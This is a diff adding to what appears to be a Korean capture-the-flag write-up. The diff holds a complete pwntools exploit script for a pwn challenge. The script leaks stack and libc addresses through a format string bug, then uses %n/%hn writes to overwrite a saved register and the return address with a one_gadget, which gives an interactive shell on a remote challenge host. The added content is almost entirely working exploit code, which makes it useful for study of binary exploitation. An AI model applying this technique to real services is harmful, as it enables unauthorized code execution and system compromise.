@@ -88,3 +88,69 @@ constraints:
 
 이걸 쓰고, r12를 0으로 만들어줬다. `FSB`로 `printf` 내부 스택 프레임의 `pop r12`와 ret 부분에 덮어줘서 해결했다.
 
+### exploit.py
+
+```python
+from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+def rp(payload : bytes):
+    p.sendlineafter(b'> ', b'1')
+    for i in range(len(payload)):
+        p.send(payload[i:i+1] + b'\x80')
+    for i in range(len(payload), 64 * 64):
+        p.send(b'\x00\x60')
+
+def mc(x : int, y : int):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'x > ', str(x).encode())
+    p.sendlineafter(b'y > ', str(x).encode())
+
+def pp():
+    p.sendlineafter(b'> ', b'3')
+    return p.recvline()[:-1]
+
+#p = process('./prob')
+p = remote('43.203.137.197', 54321)
+l = ELF('./libc.so.6')
+
+num = 6 + (0x7ffc25f12bc0 - 0x7ffc25f11b80) // 8
+payload = f'%{num}$p%{num+9}$p'
+rp(payload.encode())
+
+msg = pp()
+mainrbp = int(msg[:14].decode(), 16)
+l.address = int(msg[14:28].decode(), 16) - (0x7fea359d0d90 - 0x7fea359a7000)
+print(hex(mainrbp))
+print(hex(l.address))
+
+# mainrbp = 0x7ffd93f7aff0
+# r12 = 0x7ffd93f79e70
+# ret = 0x7ffd93f79e88
+
+og = l.address + 0xebd38
+r12 = mainrbp + (0x7ffd93f79e70 - 0x7ffd93f7aff0)
+ret = mainrbp + (0x7ffd93f79e88 - 0x7ffd93f7aff0)
+payload = '%17$n%18$n'
+payload += f'%{(og & ((1 << 16) - 1))}c'
+payload += f'%19$hn'
+payload += f'%{((og >> 16) & ((1 << 16) - 1)) - (og & ((1 << 16) - 1)) + 0x10000}c'
+payload += f'%20$hn'
+payload += 'a' * 4
+print(hex(0x28 - len(payload)))
+payload = payload.encode()
+payload += p64(r12)
+payload += p64(r12 + 4)
+payload += p64(ret)
+payload += p64(ret + 2)
+mc(0, 0)
+rp(payload)
+#gdb.attach(p, f"b* {l.address + (0x7f8ac570c734 - 0x7f8ac5695000)}")
+p.sendlineafter(b'> ', b'3')
+p.interactive()
+```
+
+---
+## crypto/Encrypted flag
+
